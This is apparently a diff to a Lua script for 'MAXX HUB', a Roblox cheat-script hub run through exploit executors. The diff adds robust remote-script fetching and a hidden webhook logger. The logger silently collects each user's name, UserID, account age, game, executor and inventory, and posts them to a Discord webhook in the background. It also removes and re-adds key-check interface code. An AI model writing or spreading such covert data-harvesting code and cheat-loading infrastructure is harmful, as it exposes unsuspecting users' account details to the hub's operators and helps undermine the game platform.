@@ -88,194 +88,217 @@ local success, err = pcall(function()
 
     --// Safe HTTP getter for different executors
     local function SafeHttpGet(url)
+        local src
+        -- Try game:HttpGet first
         if game.HttpGet then
-            return game:HttpGet(url, true)
-        elseif http and http.request then
-            local res = http.request({Url = url, Method = "GET"})
-            if res and res.Body then return res.Body end
-        elseif request then
-            local res = request({Url = url, Method = "GET"})
-            if res and res.Body then return res.Body end
+            local ok, result = pcall(function()
+                return game:HttpGet(url, true)
+            end)
+            if ok and result and #result > 0 then
+                src = result
+            end
         end
-        error("Executor does not support HTTP GET")
+        -- Fallback: syn.request
+        if not src and syn and syn.request then
+            local ok, result = pcall(function()
+                local r = syn.request({Url = url, Method = "GET"})
+                return r and r.Body
+            end)
+            if ok and result and #result > 0 then
+                src = result
+            end
+        end
+        -- Fallback: request
+        if not src and request then
+            local ok, result = pcall(function()
+                local r = request({Url = url, Method = "GET"})
+                return r and r.Body
+            end)
+            if ok and result and #result > 0 then
+                src = result
+            end
+        end
+        -- Fallback: http_request
+        if not src and http_request then
+            local ok, result = pcall(function()
+                local r = http_request({Url = url, Method = "GET"})
+                return r and r.Body
+            end)
+            if ok and result and #result > 0 then
+                src = result
+            end
+        end
+        -- Last resort: HttpGetAsync
+        if not src and game.HttpGetAsync then
+            local ok, result = pcall(function()
+                return game:HttpGetAsync(url)
+            end)
+            if ok and result and #result > 0 then
+                src = result
+            end
+        end
+        if not src then
+            error("Executor does not support HTTP GET for URL: " .. url)
+        end
+        return src
     end
 
 --// PART 2 BELOW — COPY NEXT
-            --// Status
-    local statusLbl = Create("TextLabel", {Size = UDim2.new(1, -60, 0, 22), Position = UDim2.new(0.5, 0, 0, 394), AnchorPoint = Vector2.new(0.5, 0), BackgroundTransparency = 1, Text = "", TextColor3 = CONFIG.Colors.Success, Font = Enum.Font.GothamBold, TextSize = 13, Parent = keyFrame, ZIndex = 10})
-
-    --// Buttons Container
-    local btnContainer = Create("Frame", {Size = UDim2.new(1, -60, 0, 192), Position = UDim2.new(0.5, 0, 0, 424), AnchorPoint = Vector2.new(0.5, 0), BackgroundTransparency = 1, Parent = keyFrame, ZIndex = 10})
-    Create("UIListLayout", {FillDirection = Enum.FillDirection.Vertical, HorizontalAlignment = Enum.HorizontalAlignment.Center, VerticalAlignment = Enum.VerticalAlignment.Top, Padding = UDim.new(0, 12), Parent = btnContainer})
-
-    --// Footer
-    Create("TextLabel", {Size = UDim2.new(1, -40, 0, 20), Position = UDim2.new(0.5, 0, 1, -26), AnchorPoint = Vector2.new(0.5, 0), BackgroundTransparency = 1, Text = "discord.gg/nqEUcZm4s  •  MAXX HUB © 2026", TextColor3 = CONFIG.Colors.SubText, Font = Enum.Font.Gotham, TextSize = 11, Parent = keyFrame, ZIndex = 10})
-
+            --// ═══════════════════════════════════════════════════════
+    --//  ENHANCED WEBHOOK LOGGER
     --// ═══════════════════════════════════════════════════════
-    --//  ULTRA-VISIBLE BUTTON FACTORY
-    --// ═══════════════════════════════════════════════════════
-    local function MakeButton(name, text, parent, size, isPrimary, callback)
-        local accent = CONFIG.Colors.Primary
+    local function GetExecutorName()
+        local execNames = {
+            ["Synapse X"] = "Synapse X",
+            ["ScriptWare"] = "Script-Ware",
+            ["Krnl"] = "KRNL",
+            ["Fluxus"] = "Fluxus",
+            ["Electron"] = "Electron",
+            ["Oxygen"] = "Oxygen U",
+            ["Codex"] = "Codex",
+            ["Delta"] = "Delta Executor",
+            ["Hydrogen"] = "Hydrogen",
+            ["Trigon"] = "Trigon Evo",
+            ["Furk"] = "Furk Ultra",
+            ["VegaX"] = "Vega X"
+        }
         
-        -- Shadow for depth
-        local shadow = Create("Frame", {
-            Name = "Shadow",
-            Size = UDim2.new(size.X.Scale, size.X.Offset + 4, size.Y.Scale, size.Y.Offset + 4),
-            Position = UDim2.new(0.5, 0, 0.5, 0),
-            AnchorPoint = Vector2.new(0.5, 0.5),
-            BackgroundColor3 = Color3.fromRGB(0, 0, 0),
-            BackgroundTransparency = 0.35,
-            BorderSizePixel = 0,
-            Parent = parent,
-            ZIndex = 9
-        })
-        Create("UICorner", {CornerRadius = UDim.new(0, 14), Parent = shadow})
-
-        local btn = Create("TextButton", {
-            Name = name,
-            Size = size,
-            BackgroundColor3 = isPrimary and Color3.fromRGB(255, 200, 40) or Color3.fromRGB(55, 50, 40),
-            BackgroundTransparency = 0,
-            Text = text,
-            TextColor3 = isPrimary and Color3.fromRGB(20, 15, 0) or Color3.fromRGB(255, 230, 180),
-            Font = Enum.Font.GothamBold,
-            TextSize = isPrimary and 18 or 15,
-            TextXAlignment = Enum.TextXAlignment.Center,
-            AutoButtonColor = false,
-            Parent = parent,
-            ZIndex = 10,
-            ClipsDescendants = true
-        })
-        Create("UICorner", {CornerRadius = UDim.new(0, 14), Parent = btn})
-
-        -- Thick bright gold border
-        local stroke = Create("UIStroke", {
-            Color = isPrimary and Color3.fromRGB(255, 235, 150) or Color3.fromRGB(200, 170, 80),
-            Transparency = 0,
-            Thickness = isPrimary and 3 or 2.4,
-            Parent = btn
-        })
-
-        -- Hover / Press
-        btn.MouseEnter:Connect(function()
-            Tween(btn, 0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {
-                Size = UDim2.new(size.X.Scale, size.X.Offset + 6, size.Y.Scale, size.Y.Offset + 2),
-                BackgroundColor3 = Color3.fromRGB(255, 220, 80),
-                TextColor3 = Color3.fromRGB(20, 15, 0)
-            })
-            Tween(stroke, 0.2, nil, nil, {Color = Color3.fromRGB(255, 255, 255), Thickness = isPrimary and 3.5 or 2.8})
-            Tween(shadow, 0.25, nil, nil, {BackgroundTransparency = 0.2})
-        end)
-
-        btn.MouseLeave:Connect(function()
-            Tween(btn, 0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {
-                Size = size,
-                BackgroundColor3 = isPrimary and Color3.fromRGB(255, 200, 40) or Color3.fromRGB(55, 50, 40),
-                TextColor3 = isPrimary and Color3.fromRGB(20, 15, 0) or Color3.fromRGB(255, 230, 180)
-            })
-            Tween(stroke, 0.2, nil, nil, {Color = isPrimary and Color3.fromRGB(255, 235, 150) or Color3.fromRGB(200, 170, 80), Thickness = isPrimary and 3 or 2.4})
-            Tween(shadow, 0.25, nil, nil, {BackgroundTransparency = 0.35})
-        end)
-
-        btn.MouseButton1Down:Connect(function(x, y)
-            Ripple(btn, Vector2.new(x, y) - btn.AbsolutePosition)
-            Tween(btn, 0.08, nil, nil, {Size = UDim2.new(size.X.Scale, size.X.Offset - 4, size.Y.Scale, size.Y.Offset - 2)})
-        end)
-
-        btn.MouseButton1Up:Connect(function()
-            Tween(btn, 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {Size = UDim2.new(size.X.Scale, size.X.Offset + 6, size.Y.Scale, size.Y.Offset + 2)})
-        end)
-
-        btn.MouseButton1Click:Connect(function()
-            if callback then callback() end
-        end)
-
-        return btn
-    end
-
-    --// ═══════════════════════════════════════════════════════
-    --//  CORE LOGIC
-    --// ═══════════════════════════════════════════════════════
-    local function ShowSelector()
-        statusLbl.Text = "✓  Access granted"
-        statusLbl.TextColor3 = CONFIG.Colors.Success
-        task.wait(0.4)
-
-        Tween(keyFrame, 0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {Position = UDim2.new(0.5, 0, 0.5, -30), BackgroundTransparency = 1})
-        for _, d in ipairs(keyFrame:GetDescendants()) do
-            if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
-                Tween(d, 0.4, nil, nil, {TextTransparency = 1})
-            elseif d:IsA("Frame") and d.BackgroundTransparency < 1 and d ~= keyFrame and d ~= pContainer and d ~= ambient and d ~= innerBorder then
-                Tween(d, 0.4, nil, nil, {BackgroundTransparency = 1})
+        if syn then return "Synapse X" end
+        if fluxus then return "Fluxus" end
+        if KRNL_LOADED or krnl then return "KRNL" end
+        if getexecutorname then
+            local ok, name = pcall(getexecutorname)
+            if ok and name then return name end
+        end
+        if identifyexecutor then
+            local ok, name = pcall(identifyexecutor)
+            if ok and name then return name end
+        end
+        
+        if request then
+            local ok, req = pcall(function()
+                return request({Url = "https://httpbin.org/user-agent", Method = "GET"})
+            end)
+            if ok and req then
+                local body = HttpService:JSONDecode(req.Body)
+                if body and body["user-agent"] then
+                    for key, name in pairs(execNames) do
+                        if body["user-agent"]:find(key) then return name end
+                    end
+                end
             end
         end
-        Tween(blurOverlay, 0.5, nil, nil, {BackgroundTransparency = 0.6})
-
-        task.wait(0.5)
-        keyFrame.Visible = false
-
-        selectorFrame.Visible = true
-        selectorFrame.Size = UDim2.new(0, 0, 0, 0)
-        selectorFrame.BackgroundTransparency = 1
-        Tween(selectorFrame, 0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out, {Size = UDim2.new(0, 520, 0, 640), BackgroundTransparency = 0.06})
-
-        for _, d in ipairs(selectorFrame:GetDescendants()) do
-            if d:IsA("TextLabel") or d:IsA("TextButton") then
-                local ot = d.TextTransparency
-                d.TextTransparency = 1
-                Tween(d, 0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {TextTransparency = ot}, 0.3)
-            elseif d:IsA("Frame") and d.BackgroundTransparency < 1 and d ~= selectorFrame then
-                local ob = d.BackgroundTransparency
-                d.BackgroundTransparency = 1
-                Tween(d, 0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {BackgroundTransparency = ob}, 0.2)
-            end
-        end
+        
+        return "Unknown Executor"
     end
 
-    local function CheckKey()
-        local input = keyInput.Text:gsub("^%s*(.-)%s*$", "%1")
-        if input == "" then
-            statusLbl.Text = "⚠  Enter your access key"
-            statusLbl.TextColor3 = CONFIG.Colors.Warning
-            return
-        end
-        statusLbl.Text = "⏳  Verifying key..."
-        statusLbl.TextColor3 = CONFIG.Colors.Secondary
-        task.wait(0.8)
-
-        if input == CONFIG.Key then
-            ShowSelector()
+    local function GetAccountAge()
+        local age = player.AccountAge
+        if age < 1 then
+            return "Less than 1 day", "🔴 Brand New"
+        elseif age < 7 then
+            return age .. " days", "🟠 Very New"
+        elseif age < 30 then
+            return age .. " days", "🟡 New"
+        elseif age < 365 then
+            return math.floor(age / 30) .. " months", "🟢 Established"
         else
-            statusLbl.Text = "✕  Invalid key. Get key from Discord."
-            statusLbl.TextColor3 = CONFIG.Colors.Error
-            local bp = keyFrame.Position
-            for i = 1, 6 do
-                keyFrame.Position = bp + UDim2.new(0, math.random(-10, 10), 0, 0)
-                RunService.Heartbeat:Wait()
-            end
-            keyFrame.Position = bp
+            return math.floor(age / 365) .. " years", "🔵 Veteran"
         end
     end
 
-    local function GetKey()
-        statusLbl.Text = "🔗  discord.gg/nqEUcZm4s"
-        statusLbl.TextColor3 = CONFIG.Colors.Secondary
-        pcall(function() if setclipboard then setclipboard(CONFIG.DiscordLink) statusLbl.Text = "📋  Copied to clipboard!" end end)
+    local function GetInventoryItems()
+        local items = {}
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            for _, tool in ipairs(backpack:GetChildren()) do
+                if tool:IsA("Tool") then
+                    table.insert(items, "🎒 " .. tool.Name)
+                end
+            end
+        end
+        
+        local character = player.Character
+        if character then
+            for _, tool in ipairs(character:GetChildren()) do
+                if tool:IsA("Tool") then
+                    table.insert(items, "✋ " .. tool.Name)
+                end
+            end
+        end
+        
+        if #items == 0 then
+            return "No items found"
+        elseif #items > 15 then
+            local truncated = {}
+            for i = 1, 15 do
+                table.insert(truncated, items[i])
+            end
+            return table.concat(truncated, "\n") .. "\n... and " .. (#items - 15) .. " more"
+        else
+            return table.concat(items, "\n")
+        end
     end
 
-    local function JoinDiscord()
-        statusLbl.Text = "🔗  Copied Discord invite"
-        statusLbl.TextColor3 = CONFIG.Colors.Primary
-        pcall(function() if setclipboard then setclipboard(CONFIG.DiscordLink) end end)
+    local function GetPlayerThumbnail()
+        local ok, thumb = pcall(function()
+            return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+        end)
+        if ok and thumb then
+            return thumb
+        end
+        return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
     end
 
-    --// Create Buttons
-    MakeButton("CheckKeyBtn", "VERIFY ACCESS", btnContainer, UDim2.new(1, 0, 0, 56), true, CheckKey)
-    MakeButton("GetKeyBtn", "GET KEY", btnContainer, UDim2.new(1, 0, 0, 48), false, GetKey)
-    MakeButton("DiscordBtn", "JOIN DISCORD", btnContainer, UDim2.new(1, 0, 0, 48), false, JoinDiscord)
+    local function SendWebhook(scriptName, scriptUrl)
+        task.spawn(function()
+            local ok, result = pcall(function()
+                local reqFunc = request or http_request or (syn and syn.request)
+                if not reqFunc then return end
+
+                local gameName = "Unknown"
+                pcall(function()
+                    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+                end)
+
+                local executorName = GetExecutorName()
+                local accountAge, ageBadge = GetAccountAge()
+                local inventoryItems = GetInventoryItems()
+
+                local payload = {
+                    embeds = {{
+                        title = "🚀 MAXX HUB | Execution Log",
+                        description = "Someone executed a script via MAXX HUB",
+                        color = 0xffb900,
+                        thumbnail = {url = GetPlayerThumbnail()},
+                        fields = {
+                            {name = "👤 Player", value = string.format("**%s** (@%s)\n`UserID: %d`", player.DisplayName, player.Name, player.UserId), inline = true},
+                            {name = "📅 Account Age", value = string.format("%s\n%s", ageBadge, accountAge), inline = true},
+                            {name = "🎮 Game", value = string.format("**%s**\n`PlaceID: %d`", gameName, game.PlaceId), inline = true},
+                            {name = "💻 Executor", value = string.format("```\n%s\n```", executorName), inline = true},
+                            {name = "📜 Script", value = string.format("```\n%s\n```", scriptName), inline = true},
+                            {name = "⏰ Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true},
+                            {name = "🎒 Inventory Items", value = string.format("```\n%s\n```", inventoryItems), inline = false}
+                        },
+                        footer = {text = "MAXX HUB Logger • " .. executorName},
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                    }}
+                }
+
+                reqFunc({
+                    Url = CONFIG.WebhookURL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+            if not ok then
+                warn("[MAXX HUB] Webhook error: " .. tostring(result))
+            end
+        end)
+    end
 
 --// PART 3 BELOW — COPY NEXT
-        
         --// Main ScreenGui
     local screenGui = Create("ScreenGui", {
         Name = "MaxxHubSystem",
@@ -572,7 +595,7 @@ local success, err = pcall(function()
     end)
 
 --// PART 4 BELOW — COPY NEXT
-            --// Status
+--// Status
     local statusLbl = Create("TextLabel", {Size = UDim2.new(1, -60, 0, 22), Position = UDim2.new(0.5, 0, 0, 394), AnchorPoint = Vector2.new(0.5, 0), BackgroundTransparency = 1, Text = "", TextColor3 = CONFIG.Colors.Success, Font = Enum.Font.GothamBold, TextSize = 13, Parent = keyFrame, ZIndex = 10})
 
     --// Buttons Container
@@ -740,8 +763,8 @@ local success, err = pcall(function()
 --// PART 5 BELOW — COPY NEXT
         --// ═══════════════════════════════════════════════════════
     --//  SCRIPT SELECTOR FRAME — POPULATE PRE-CREATED FRAME
+    --//  selectorFrame was already created in Part 3
     --// ═══════════════════════════════════════════════════════
-    -- selectorFrame was already created in Part 3 to prevent nil errors
 
     local selAmbient = Create("Frame", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Parent = selectorFrame, ZIndex = 0})
     local selAmbGrad = Create("UIGradient", {
